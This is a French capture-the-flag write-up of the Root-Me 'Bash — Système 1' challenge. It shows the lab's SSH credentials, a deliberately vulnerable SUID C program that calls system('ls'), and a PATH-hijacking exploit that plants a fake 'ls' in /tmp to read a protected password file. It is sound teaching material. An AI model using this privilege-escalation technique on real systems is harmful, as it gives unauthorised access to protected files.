# Exercice 1 — Bash — Système 1

## Contexte

- Protocole : SSH
- Port : `2222`
- Hôte : `challenge02.root-me.org`
- Utilisateur : `app-script-ch11`
- Mot de passe : `app-script-ch11`

```bash
ssh -p 2222 app-script-ch11@challenge02.root-me.org
```

## Code source

```c
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main(void) {
  setreuid(geteuid(), geteuid());
  system("ls /challenge/app-script/ch11/.passwd");
  return 0;
}
```

## Objectif

Afficher le contenu de `/challenge/app-script/ch11/.passwd`.

## Analyse

Le binaire est configuré avec le bit SUID. Cela permet à un utilisateur non privilégié d'exécuter un programme avec les droits du propriétaire.

On constate que le propriétaire du binaire est un utilisateur possédant l'accès au fichier secret.

```bash
stat /challenge/app-script/ch11/ch11
```

La sortie révèle un bit SUID actif :

```text
Access: (4550/-r-sr-x---)  Uid: (1408/app-script-ch11-cracked)  Gid: (1311/app-script-ch11)
```

## Exploitation

### 1. Créer un faux `ls`

```bash
cd /tmp
cat > ls <<'EOF'
#!/bin/sh
cat /challenge/app-script/ch11/.passwd
EOF
chmod +x ls
export PATH=/tmp:$PATH
```

### 2. Exécuter le binaire SUID

```bash
/challenge/app-script/ch11/ch11
```

## Explication

`setreuid(geteuid(), geteuid())` force l'UID réel et l'UID effectif à celui du programme. Comme le binaire porte le bit SUID, il s'exécute avec les permissions du propriétaire.

`system("ls ...")` appelle un shell, qui recherche la commande `ls` dans `PATH`. En remplaçant `ls` par un faux binaire dans `/tmp`, on force l'exécution de notre commande malveillante.
